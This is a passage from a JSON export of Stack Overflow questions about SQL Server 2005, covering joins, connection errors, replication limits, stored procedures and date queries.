remove the H and 0 (but only if there is a 0 that directly follows the H). Unless there is a way to do the opposite and add the H / H0 from the results of the other table.</p>\n\n<pre><code>example data\ntable1.cavity   table2.cavity\n     H01      =    1\n     H02      =    2\n     H10      =    10\n     H12      =    12\n</code></pre>\n\n<p>It doesn't matter to me if my query results are the H0 version or not; I just need the joins to work; I can accommodate for either result in the end.</p>\n\n<p>I am using SQL Server 2005</p>\n\n<p>I have the rest of the query and it works ok; I just need this extra join added. Please help! Any help is GREATLY APPRECIATED. Thank you</p>\n"},{"tags":["sql-server-2005","nhibernate","connection-pooling","nhibernate-3"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13033099,"title":"Connection pooling using custom connection provider","body":"<p>Is connection pooling enabled when you use a custom connection provider that generates connection strings dynamically? The user is the only data changed in the connection string, and many sessions can be opened for the same user through the time. By the way, I'm using NHibernate 3.0 to connect to a database in SQL Server 2005.</p>\n"},{"tags":["asp.net","sql-server-2005","replication"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":2775,"score":4,"question_id":925824,"title":"when insert length of lob data to be replicated exceeds configured maximum 65536","body":"<p>I am trying to insert a value into a column of datatype image in SQL Server. I am getting the following error:</p>\n\n<pre><code>Length of LOB data (70823) to be replicated exceeds configured maximum 65536.  \nThe statement has been terminated.\n</code></pre>\n\n<p>The data length is less than 2 MB.</p>\n\n<p>What is the problem?</p>\n"},{"tags":["linq","query","sql-server-2005","entity-framework-4"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":396,"score":2,"question_id":10431578,"title":"Linq query giving Invalid column name \"xyz\" error","body":"<p>I am using this LINQ query</p>\n\n<pre><code>var db = new XYZ();\nvar product = (from cp in db.CatalogProducts\n               where cp.ProductID == productId\n               select cp).FirstOrDefault();\n</code></pre>\n\n<p>Running this query gives me an error </p>\n\n<blockquote>\n  <p>Invalid column name 'Cracker Cruncher'.<br>\n  Invalid column name 'crushing torque'.<br>\n  Invalid column name 'Slicing velocity'.</p>\n</blockquote>\n\n<p>Can any one help me in this matter?</p>\n\n<p>Gautam</p>\n"},{"tags":["sql-server-2005","c#-4.0","return-value","asp.net-4.0"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":13002375,"title":"execute a stored procedure that returns a \" completed succesfully \" clue","body":"<p>i have a stored procedure </p>\n\n<pre><code>UPDATE tblTime\nSET TimeOut = DATEADD(HOUR,8,TimeIn)\nWHERE tId =\n( \n   SELECT MAX(tId)\n   FROM tblTime\n   WHERE UserId = 3571\n)\n</code></pre>\n\n<p>although there's no question really, in that case if it did succeed in this query</p>\n\n<p>cause even if the field is empty or if it has value,\nit will in this case succeed</p>\n\n<p>but i do need it for future other queries... and also ,\n in this case i want the C# code to report \nnot only that it was requesting query to be execute - meaning it did happen,</p>\n\n<p>but to get an <strong>actual answer</strong> from sql server\n as a return value that c# could use or turn into <code>Boolean</code></p>\n"},{"tags":["sql-server-2005","visual-studio-2012",".net-4.5"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13028804,"title":"MsSQL connection failed - Visual Studio 2012","body":"<p>After installing Visual Studio 2012 I no longer can connect to MSSql databases.\n(I had Visual Studio 2010 installed before, now I have both installed)</p>\n\n<p>I can't make connections from the Server Explorer and I also can't connect programmatically.\nI get the following error:</p>\n\n<p><strong>\"A connection was successfully established with the server, but then an error occurred during the pre-login handshake. (provider: TCP Provider, error: 0 - The handle is invalid.)\"</strong></p>\n\n<p>I uninstalled the .NET framework 4.5. After that I was able to connect to the database, but unfortunately I got other errors. When I repaired my Visual Studio 2012 installation (it automatically installed .NET framework 4.5) I got the same error again.</p>\n"},{"tags":["sql-server-2005","ssis","imap"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1470,"score":0,"question_id":416490,"title":"Fetch mail attachment into SQL Server 2005 using IMAP","body":"<p>I need to import data into my SQL Server 2005 from an e-mail datasource on an Exchange mail server. It means that when a mail is sent to a particular mail address I must retrieve the mail subject and the attached file and then I must import these data into my SQL Server 2005, using IMAP.</p>\n\n<p>Can I do this with SSIS, or do I have to write a Windows Service in C# ?</p>\n\n<p>Do I need to use an IMAP API library of some kind ?</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13025480,"title":"I want to create an mdf file of 2GB in SQL Server 2005.","body":"<p>I want to create a new <code>.mdf</code> file of 2GB in SQL Server 2005. </p>\n\n<p>What can I do to create 2GB file?</p>\n"},{"tags":["sql","sql-server-2005","netezza"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":56,"score":-1,"question_id":12953646,"title":"Find Dates - SQL","body":"<p>I have the following from and to dates and need to list using a dynamic sql query only the 3 dates that are mentioned below in netezza database</p>\n\n<pre><code>   From      To\n20120603    20120831\n\n\nRequired Result:     \n20120702\n20120703\n20120801\n</code></pre>\n\n<p>Is there a possibility using dynamic SQL query for netezza that dates in a user specified range can be generated.</p>\n"},{"tags":["forms","sql-server-2005","ms-access","vba","ms-access-2007"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3124,"score":0,"question_id":9394229,"title":"running select query in ms access 2007 vba and assign the resulting value to a textbox","body":"<p>I need to run a sql query and the resulting value is assigned to a textbox in the form.\nI am using docmd.runsql sql to run this query.</p>\n\n<pre><code>Private Sub Form_Current()\nDim SQL As String\nDim db As Database\nDim rs As DAO.Recordset\n\nIf IsNull(Me.txtInstalledQuantity) Then\nSQL = \"select count(tblequipmentbase.id)AS CountInstalledQuantity FROM (tblequipmentbase INNER JOIN     tblequipmentparts ON tblequipmentbase.id=tblequipmentparts.idconnect) INNER JOIN tblparts ON tblequipmentparts.idpart=tblparts.id where tblparts.id= \" &amp; txtQueryID.Value &amp; \";\"\nSet db = CurrentDb\nSet rs = db.OpenRecordset(SQL)\nDoCmd.RunSQL SQL\nMe.txtInstalledQuantity = rs!CountInstalledQuantity\nSet rs = Nothing\nSet db = Nothing\nEnd If\nEnd Sub\n</code></pre>\n\n<p>The error is in the runsql command.</p>\n"},{"tags":["sql-server-2005","ubuntu","ssh","http-tunneling"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13023450,"title":"How can I route tcp requests from local clients through an ssh tunnel on ubuntu?","body":"<p>I would like redirect tcp requests from local clients send to a ubuntu server through an ssh tunnel. Is that possible?</p>\n\n<p>Some details:\nI have a ubuntu server (192.168.10.3) that waits for SSH connects from the internet. These connections are not established directly since the client computers are behind a proxy, so I use the http-tunnel package.</p>\n\n<p>Once the connection is established clients from the ubuntu server's lan (192.168.10.*) should be able to reach a certain server over the ssh tunnel. Specifically I want to connect e.g. from 192.168.10.4 to an sql server instance over the tunnel.</p>\n\n<p>As far as I understand it, the ssh tunnel has to be bidirectional. I think I know how to configure it that way.</p>\n\n<p>But how do I tell the ubuntu server to redirect tcp conections from the lan through the tunnel?</p>\n\n<p>(Hope I didn't explain it to complicated.)</p>\n\n<p>Thanks,\nSascha</p>\n"},{"tags":["sql","sql-server","sql-server-2005","group"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":13020575,"title":"Combining multiple column values into a single column row result","body":"<p>I have a query that pulls in group sale orders for a venue.  My current query pulls all of the info I need, but gives me multiple rows for each order number:</p>\n\n<pre><code>ordCode cltClientName          adrCityDesc  adrStateDesc    adrZipCode  gsnValue2   evShow  shDescr\n739802  Stevens Elementary,    Aberdeen         WA             98520       64        183    Group - Museum Admission\n739802  Stevens Elementary,    Aberdeen         WA             98520       64        237    Extreme Planets\n</code></pre>\n\n<p>What I would like to see is a single row for each order, but with the last column having results separated by comma:</p>\n\n<pre><code>ordCode cltClientName          adrCityDesc  adrStateDesc    adrZipCode  gsnValue2   evShow  shDescr\n739802  Stevens Elementary,    Aberdeen         WA             98520       64        183    Group - Museum Admission, Extreme Planets\n</code></pre>\n\n<p>The Query:</p>\n\n<pre><code>SELECT DISTINCT(ordCode),\n        cltClientName, \n        adrCityDesc,\n        adrStateDesc,\n        adrZipCode,\n        gsnValue2,\n        evShow,\n        shDescr\n\n--COUNT(tiCode)\n  from Orders \n        inner join OrderContacts on orcOrderNumber = ordCode\n        inner join Clients on orcClientID = cltCode\n        inner join ClientAddresses on cltCode = claClientCode\n        inner join Addresses on claAddressCode = adrCode\n        inner join Tickets on tiOrder = ordCode\n        inner join dbo.Events on tiEvent = evCode\n        inner join GroupSaleNotes on ordCode = gsnOrderNumber\n        inner join Shows on evShow = shCode\n WHERE ordOrderTypeTitle = 7 -- Group Sales only\n  and ordOpenDate between '2011-06-01 00:00:00.000' and '2012-05-31 23:59:59.999'\n  and gsnNoteType = '5'\n  and cltIsGroupLeader = '1'\n   --and evShow in (106, 107)\n GROUP BY ordCode, cltClientName, cltCode, adrCityDesc, adrStateDesc,\n      adrZipCode, gsnValue2, evShow, shDescr\nORDER BY adrCityDesc, cltClientName\n</code></pre>\n\n<p>Is there a way to combine this part of the result set?</p>\n"},{"tags":["sql","tsql","sql-server-2005","stored-procedures","clrstoredprocedure"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13008464,"title":"How to extract date fields from string/text field in sql server 2005","body":"<p>There is a text filed in a table called as description. I would like to extract two date fields from this string when there is an occurrence of '~' character using sql server 2005 stored procedure. Help me out in this case.</p>\n\n<p>Example: string: ';10/1/2012 ~ 10/31/2012'. At occurrence of ~ operator I would like to have from-date: 20121001 and to-date:20121031.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures"],"answer_count":6,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":858,"score":4,"question_id":337601,"title":"Stored Procedures to .sql files","body":"<p>Is there a simple process in SQL 2005 for spitting all of my stored procedures out to individual .sql files.  I'd like to move them into VSS, but am not too excited by the prospect of clicking on each one to get the source, dumping it into a text file and so on.. </p>\n"},{"tags":["asp.net","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13019248,"title":"Asp.net SQL Server user impersonation","body":"<p>I wonder if somebody could point me in the right direction. We're currently looking to update an ASP.NET application that uses SQL Server 2005 for its db. We need to provide robust and consistent functionality that prevents certain users creating, updating, deleting certain records from the database.</p>\n\n<p>Unfortunately, the application isn't written using OO concepts, instead favouring many data access stored procedures called directly from the web page code behind files. Due to the sheer amount of stored procedures we'd prefer to investigate database triggers to implement our security. </p>\n\n<p>The question is; is it possible for the db trigger to be aware of the specific application user (managed using custom user account tables in the db) which executed the sp? All we'd need is an id. The connection string used to connect to the db is identical for all users (taken from the web.config), is there a way for the connection to some how either impersonate a user, or set a specific variable accessible to the trigger?</p>\n"},{"tags":["sql-server-2005","management-studio"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13006301,"title":"SQL Server Management Studio terminates silently","body":"<p>I am facing issue that SQL Server Management Studio terminates silently apparently when text in message panel is too big e.g. a few million rows. </p>\n\n<p>Is there a solution for this? </p>\n\n<p>And also can we clear this message panel while stored procedure is executing? I am using print statement to see the status of execution. FYI I have data of 3+ million rows to process.</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008","reporting-services"],"answer_count":3,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":9321,"score":4,"question_id":1097690,"title":"Converting SQL2008 RDL file to SQL2005","body":"<p>How do I convert a RDL file that was created using the SQL2008 designer to work on SQL2005 Reporting services?</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":13015871,"title":"Slow performance with SQL Query","body":"<p>I'm having some issues with this query running in a timely manner with my 'LineItemsMap' table grows to about a million lines.  Any suggestions on indexes I could create or just better logic with the query would be greatly appreciated.  </p>\n\n<pre><code>    select \n      Id, \n      [Description],\n      SUM(CASE WHEN t1.compliant = 1  THEN 1 ELSE 0 END) as Compliant,\n      SUM(CASE WHEN t1.compliant = 0  THEN 1 ELSE 0 END) as NonCompliant,\n      LastChecked \nfrom lineitems as t0\n      left outer join lineitemsmap as t1 on t0.id = t1.lineitemid\n      left outer join art_blob as t2 on t2.art_blob_id = t1.blobid\n      left outer join art_asset as t3 on t3.art_asset_id = t2.art_asset_id\n      left outer join lineitemexceptions as t4 on t4.assetid = t3.art_asset_id and t4.lineitemid = t1.lineitemid\nwhere t0.active = 1 and t4.assetid is null\ngroup by t0.id, t0.[description], t0.lastchecked\n</code></pre>\n\n<p>Here is a link to the execute plan saved in XML:  <a href=\"http://codepaste.net/5xcpcw\" rel=\"nofollow\">http://codepaste.net/5xcpcw</a>\nHere is a link to the table structure: <a href=\"http://codepaste.net/pnqx6e\" rel=\"nofollow\">http://codepaste.net/pnqx6e</a></p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":60,"score":3,"question_id":13014108,"title":"Function Based Index in SQL SERVER 2005","body":"<p>Please suppose you have a table called BEER_HERE, with two columns: </p>\n\n<pre><code>BEER_CODE VARCHAR(50)\nBEER_DATE DATETIME\n</code></pre>\n\n<p>Please suppose also you have the availability of a function called dbo.TRUNCATE_DATE which works as follows:</p>\n\n<pre><code>dbo.TRUNCATE_DATE ('23/12/2012 23:59:57.395') ==&gt; 23/12/2012 00:00:00.000\n</code></pre>\n\n<p>I would like to create a FUNCTION BASED INDEX on:</p>\n\n<pre><code>(BEER_CODE, dbo.TRUNCATE_DATE(BEER_DATE))\n</code></pre>\n\n<p>How could I achieve this?</p>\n\n<p>Thank you in advance for your kind help.</p>\n"},{"tags":["sql-server-2005","stored-procedures","cgi","pyodbc"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":12978552,"title":"sp_addrolemember not working in Python","body":"<p>I am trying to add user permissions using this stored procedure:</p>\n\n<pre><code>exec sp_addrolemember db_datawriter, MYUSER\n</code></pre>\n\n<p>The database is MS SQL 2005 and within SQL Management Studio the stored procedure works correctly using my authorized windows login.</p>\n\n<p>I created a simple HTML CGI website with Python as the scripting language using pyodbc. I also created a local user 'dataviewer' login that I used when pyodbc connects that has the following server role permissions the same as my windows login:</p>\n\n<p><img src=\"http://i.stack.imgur.com/G8WPr.png\" alt=\"enter image description here\"></p>\n\n<p>On the website I echo back the sql command that Python used and copy and paste the exact command in SQL SMS and the stored procedure works correctly.  It seems as though there is a security conflict somewhere but not sure what is happening becasue my windows login has the same server roles permission as the dataviewer login.</p>\n"},{"tags":["sql","sql-server-2005","table","multiple"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":13012032,"title":"Multiple Databases on the same SQL Server (MS SQL)","body":"<p>I have a SQL Server with about 100 databases on it. Most of the databases follow the same schema, for example, they have a table named dbo.Files.</p>\n\n<p>I want to write a query which will return me the UNIONed result of all the dbo.Files across all databases, but without specifically referencing the tables themselves (there are too many!). I've managed to create some dynamic SQL but this seems clunky and I need to develop it.</p>\n\n<pre><code>SELECT 'SELECT count(*) FROM ' + '[' + name + ']' + '.dbo.Files'    \nFROM master..sysdatabases   \n</code></pre>\n\n<p>The query should also account for the fact that not all of the databases have a dbo.Files table (and maybe output a line saying as much)</p>\n\n<p>Thanks for your help.</p>\n"},{"tags":["sql","sql-server","database","tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":7,"view_count":102,"score":-7,"question_id":13005484,"title":"Find missing number in table in SQL Server 2005","body":"<p>I have int datatype  column as No, and want to find those No number which are missing in table.</p>\n\n<p>For example: 1,2,3,7,8,9</p>\n\n<p>Ans = 4,5,6</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","cursor"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12999239,"title":"Quering current cursor row - without selecting into variables","body":"<p>I'm using a cursor to iterate through dynamic SQL query result set. I'm fully aware that both cursors and dynamic SQL are dubious methods which best be avoided. Please do not address this topics.</p>\n\n<p>I'm fetching entire row in each iteration (and not several columns into corresponding variables). Why? because later on I need to address a dynamically changing column names. But again - that is not the matter on hand.</p>\n\n<p>Is there a way to query the current row? I have failed to do so, so far. For example, this pseudo-code \"supposed\" to do the job (return the <code>ABCD</code> column value for the current row).</p>\n\n<pre><code>SELECT [ABCD] FROM Rows_CURSOR\n</code></pre>\n\n<p>I would appreciate any useful suggestions [just saying \"do not use cursors\" is not a useful comment ;) ].</p>\n\n<p>Thank you in advance.</p>\n"},{"tags":["sql-server","sql-server-2005","iis7","asp-classic","adodb"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":103,"score":1,"question_id":12988879,"title":"Error with classic asp database connection after migration of website from IIS6 to IIS7","body":"<p>I have a classic asp site which has the following database connection:</p>\n\n<pre><code>&lt;%\nset objConnection = Server.CreateObject(\"ADODB.Connection\")\nobjConnection.ConnectionString = \"Driver={SQL Server};Server=123.456.789.012;Database=mydatabase;Uid=myuser;Pwd=123xyz;\"\nobjConnection.Open\n%&gt;\n</code></pre>\n\n<p>The site has just been moved from a Windows 2003 server running IIS6 to a Windows 2008 server running IIS7 (both using MSSQL 2005 Express database) and it now gives an error message:</p>\n\n<pre><code>Microsoft OLE DB Provider for ODBC Drivers error '80004005'\n[Microsoft][ODBC SQL Server Driver][DBNETLIB]Invalid connection.\n/inc/dbconnection.asp, line 4 \n</code></pre>\n\n<p>I'm assuming it's because there's a different driver with IIS7?  What would be the updated connection string to get this to work - I've googled and just not found anything that works or makes sense to me (I'm at the edge of my understanding here to be honest!)?</p>\n\n<p>Many thanks for any pointers folks...</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13007313,"title":"Writing update Query for updating a column based on certain conditions","body":"<p>I had written a query like this.</p>\n\n<pre><code>Update Dynamic_Grid \nset TRIAL=(Select Trial from TEMP) \nwhere UsrCode='ll1' \nand ColumnName=(Select ColumnName from TEMP)\n</code></pre>\n\n<p>It is throwing error. Can anyone please try to correct it?</p>\n"},{"tags":["asp.net",".net","performance","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":13007716,"title":"Performance of web application .net 2.0","body":"<p>I have just started working over a website written in .net 2.0. Pages take long to load and response time is quite low, not sure where to start from in order to improve performance of the same.</p>\n\n<p>Hardware is not a problem as there is enough memory and processor is also good enough.</p>\n\n<p>Any Idea where should I start from and to improve the performance.</p>\n"},{"tags":["sql-server-2005","sql-server-2008","maintenance"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1038,"score":1,"question_id":3184286,"title":"How to create maintenance plan in sql server?","body":"<p>when i m trying to create new maintenance plan in sql server it is popping up this error-</p>\n\n<pre><code>TITLE: Microsoft SQL Server Management Studio\n------------------------------\n\n'Agent XPs' component is turned off as part of the security configuration for \nthis server. A system administrator can enable the use of 'Agent XPs' by using   sp_configure. \nFor more information about enabling 'Agent XPs', see \"Surface Area   Configuration\" in \nSQL Server Books Online. (ObjectExplorer)  \n</code></pre>\n"},{"tags":["vb.net","sql-server-2005","where-clause"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":13007787,"title":"how to use multiple columns in where clause in sql server 2005?","body":"<p>I want to search ID of employee by his name. so I have taken a textbox to enter his name and a search button. The ID and name of employee is stored in Employee table but the name is stored in 3 columns ie firstname, middlename and lastname.\n  So my problem is how to write query for searching ID as i will have to use the above mentioned 3 columns to compare the name with the name entered in the textbox.</p>\n\n<p>Please help me out with this.\nthanks in advance.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":12977754,"title":"How to detect ranges of IDs with the same number of records inside them","body":"<p>In a SQL SERVER 2005 database, please suppose we have a table called RUNNING_COLA_IS_AFRICA.</p>\n\n<p>This table has a unique varchar(50) field called RUNNING_ID.</p>\n\n<p>We have 1 million records in this table.</p>\n\n<p>I would like to write a query that, sorting by RUNNING_ID ASC, and stating a range of 50, produces an output similar to the following:</p>\n\n<pre><code>RUNNING_ID_START RUNNING_ID_END\n000000           000103\n000104           000767\n000892           001492\n001576           011222\n012345           013579\n</code></pre>\n\n<p>This means that:</p>\n\n<pre><code>a) The number of the records between 000000 and 000103 is 50;\nb) The number of the records between 000104 and 000767 is 50;\nc) The number of the records between 000892 and 001492 is 50;\nd) The number of the records between 001576 and 011222 is 50;\ne) The number of the records between 012345 and 013579 is &lt;= 50.\n</code></pre>\n\n<p>Of course, min(RUNNING_ID) = 000000 and max(RUNNING_ID) = 013579 because they are ordered by RUNNING_ID ASC.</p>\n\n<p>How could I achieve this in SQL SERVER 2005?</p>\n\n<p>Thank you in advance for your kind help.</p>\n"},{"tags":["visual-studio-2010","sql-server-2005","reporting"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":790,"score":3,"question_id":7105848,"title":"Use MS SQL Server 2005 Reporting Services with Visual Studio 2010","body":"<p>While writing this question I had a simple idea which fixed the issue. Maybe other people have the same problem or you would like to comment this so I'm posting it anyways.</p>\n\n<p>tldr/simplified question:\nHow do i use MS SQL Server 2005 Reporting Services in Visual Studio 2010?</p>\n\n<p>Solution:\nJust copy the Visual Studio 2008 Reporting DLLs in your project and include them as references. I guess you have to own a licence for vss2008 when doing this but technically this solves the issue.</p>\n\n<p>Original question:</p>\n\n<blockquote>\n  <p>How can i use MS SQL Server 2005 Reporting Services in Visual Studio\n  2010? The reason i ask this is the following: We migrated to\n  VSS 2010 as our IDE but are still using MS SQL Server 2005.</p>\n  \n  <p>Now, i want to change a piece of code in a Project which makes use of\n  Reporting Services on said SQL Server. </p>\n  \n  <p>After converting the Solution to a VSS2010 Solution I get BuildErrors\n  because it can't find the namespaces \"ReportViewer\" and \"Reporting\".\n  That's because the references to</p>\n  \n  <ul>\n  <li>Microsoft.ReportViewer.Common (9.0.0.0)</li>\n  <li>Micrsofot.ReportViewer.WinForms (9.0.0.0)</li>\n  </ul>\n  \n  <p>Are no longer resolvable. So i have to replace them with the\n  references to the same Assemblies in Version 10.0.0.0.</p>\n  \n  <p>After doing that the Solution builds successfully, but when opening\n  the ReportViewer i get an SoapVersionMismatchException telling me that\n  for Remote-Processing i have to use Microsoft SQL Server 2008\n  Reporting Services or higher.</p>\n</blockquote>\n"},{"tags":["sql","sql-server-2005","localhost"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":2880,"score":2,"question_id":10624287,"title":"Cant connect to SQL Server 2005 localhost","body":"<p>I've been trying to connect to SQL Server 2005 on my localhost and I can not connect...</p>\n\n<blockquote>\n  <p>Server name: (local)\\SQLEXPRESS <br>Authentication: Windows\n  Authentication</p>\n</blockquote>\n\n<p>other Server name I have tried are</p>\n\n<blockquote>\n  <p>LOCALHOST\\SQLEXPRESS<br> \n  (local)\\my local hostname</p>\n</blockquote>\n\n<p>I get this error message:</p>\n\n<blockquote>\n  <p>Cannot connect to 127.0.0.1\\SQLEXPRESS.<br> A network-related or\n  instance-specific error occurred while establishing a connection to\n  SQL Server. The server was not found or was not accessible. Verify\n  that the instance name is correct and that SQL Server is configured to\n  allow remote connections.</p>\n</blockquote>\n\n<p>SQL Server Browser is turned on in Services</p>\n\n<p>any ideas?</p>\n"},{"tags":["sql","sql-server-2005","ssms"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":41,"score":0,"question_id":13006857,"title":"Create view and use it in a single SQL script","body":"<p>Simple thing ... i thought. Create a view and use it later in the same SQL script.\nLet's say we have a script as follows:</p>\n\n<pre><code>CREATE VIEW someView AS (...)\nDROP VIEW someView\n</code></pre>\n\n<p>If I try to parse it SQL Management complaints there's an error around DROP.\nIf I execute them separately (create first, then drop) they work both fine.\nIs there any way to create a view and use it in a single SQL script?\nI could wrap further statements in string an then EXEC it but it's a bit inconvenient.</p>\n\n<p><strong>Code example was fixed (missing VIEW)</strong></p>\n\n<p>More meaningful example:</p>\n\n<pre><code>create view TEST as (select name from spt_values where number=1);\ndrop view TEST\n</code></pre>\n\n<p>Is it possible to execute it at once? \nI got the error:</p>\n\n<pre><code>Msg 156, Level 15, State 1, Procedure TEST, Line 2\nIncorrect syntax near the keyword 'drop'.\n</code></pre>\n\n<p>Running create statement separately and then dropping view works perfectly.</p>\n"},{"tags":["vb.net","sql-server-2005","data-import"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13006962,"title":"VB.NET code to import Excel data into SQL Server 2005","body":"<p>I have a problem when I imported data from Excel into SQL Server </p>\n\n<p>Return only one row from Excel although the Excel has more than 3000 rows </p>\n\n<p>I wrote this code : </p>\n\n<pre><code>Try\n        Dim ss As Integer\n        Dim myfile As String = \"D:\\acct_data.xls\"\n        Dim excelconnectionstring As String = \"Provider=Microsoft.ACE.OLEDB.12.0;Data Source=\" &amp;          myfile &amp; \";Extended Properties=\"\"Excel 12.0;HDR=Yes;\"\"\"\n        Using connectin As New System.Data.OleDb.OleDbConnection(excelconnectionstring)\n            connectin.Open()\n            Dim command As New System.Data.OleDb.OleDbCommand(\"select * from [Sheet1$]\", connectin)\n            Using dr As System.Data.OleDb.OleDbDataReader = command.ExecuteReader\n                While dr.Read\n                    If dr.HasRows Then\n                        ss = CInt(dr.Item(\"rim_no\"))\n                        MessageBox.Show(ss)\n                    End If\n                End While\n\n            End Using\n        End Using\n\n    Catch ex As Exception\n\n    End Try\n</code></pre>\n"},{"tags":["sql","sql-server-2005","netezza"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":89,"score":-2,"question_id":12939227,"title":"Find column Value by dividing with sum of a column","body":"<p>I have a table with the following columns in a Netezza Database</p>\n\n<pre><code>Id  field1  field2      \n 1   0.9    sum(field1)/0.9\n 2   1.7    sum(field1)/1.7\n 3   6.9    sum(field1)/6.9\n 4   0.4    sum(field1)/0.4\n 5   0.2    sum(field1)/0.2\n 6   2.8    sum(field1)/2.8\n 7   7.0    sum(field1)/7.0\n</code></pre>\n\n<p>The <code>field2</code> column is to be generated and will hold values as shown in the table.</p>\n\n<p>For this example the sum of <code>field1</code> is <code>19.9</code>.</p>\n\n<p>Also the <code>field1</code> values will change frequently.</p>\n\n<p>Please help with  a query that will help calculate the <code>field2</code> value also the values are in decimals so will want the precise sum.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","remedy"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":719,"score":0,"question_id":7650421,"title":"Converting a BMC Remedy timestamp to mm/dd/yyyy format","body":"<p>According to the documentation I've found from AR Systems on BMC Remedy, timestamps in an MSSQL Server environment (we're using SQL Server 2005 here) are stored as an <strong>int</strong> datatype in UNIX timestamp format.</p>\n\n<p>I cannot for the life of me get custom SQL in Business Objects Web Intelligence to let me convert this timestamp into mm/dd/yyyy format, which I need to be able to group records by a date (without the timestamp, obviously). Anything I try to do involving math or datatype conversion throws an \"invalid type\" error. I can't convert the field to an int, varchar, datetime, or anything else. The only function that works is DATEADD, which still returns the full timestamp.</p>\n\n<p>How can I get this converted? I'm going nuts here!</p>\n"},{"tags":["sql-server-2005","datetime","stored-procedures","datepart"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13001293,"title":"copy first cell to second then add hours as int (DATEPART)","body":"<p>I have data in the table like the following. </p>\n\n<pre><code>TimeIn                   TimeOut           \n-------------------------------------\n6/1/2010 09:00:00   Null     \n6/2/2010 09:00:00   6/2/2010 16:45:00       \n6/3/2010 10:05:00   Null                    \n6/4/2010 07:30:00   6/4/2010 15:45:00    \n</code></pre>\n\n<p>i have the stored procedure to find last activity with \"not signd out\" column</p>\n\n<p>i have a stored procedure for copy a cell to other too ...</p>\n\n<p>then, what i need,  is to update [TimeOut] (if there's no time out)</p>\n\n<p>via more elegant way like </p>\n\n<p><code>UPDATE TimeOut SET DATEPART(HOUR, TimeOut) = DATEPART(HOUR, TimeIN) + 8</code></p>\n\n<p>so the Whole idea was to \nfirst check if last activity - Timeout Column is null</p>\n\n<p>then if it is, sign TimeOut with max work hours allowed (8).</p>\n\n<p>is there a simple way to do it ?</p>\n\n<h2>UPDATE</h2>\n\n<p>as to marc answer , this is the selection of find out if user didn't sign out</p>\n\n<pre><code>SELECT CASE WHEN [TimeOut] IS NULL THEN '' ELSE CONVERT(NVARCHAR,[TimeOut]) END FROM tblTime WHERE tId = ( SELECT MAX(tId) FROM tblTime WHERE UserId = 123\n</code></pre>\n\n<p>so i have the query that finds who did not sign out at last activity</p>\n\n<p>then i only need to update that specific Row - field <code>TimeOut</code></p>\n\n<p>with hours of time in + 8 \nthat was my question</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":63,"score":2,"question_id":12993853,"title":"Join the table valued function in the query","body":"<p>I have one table vwuser. I want join this table with the table valued function fnuserrank(userID). So I need to cross apply with table valued 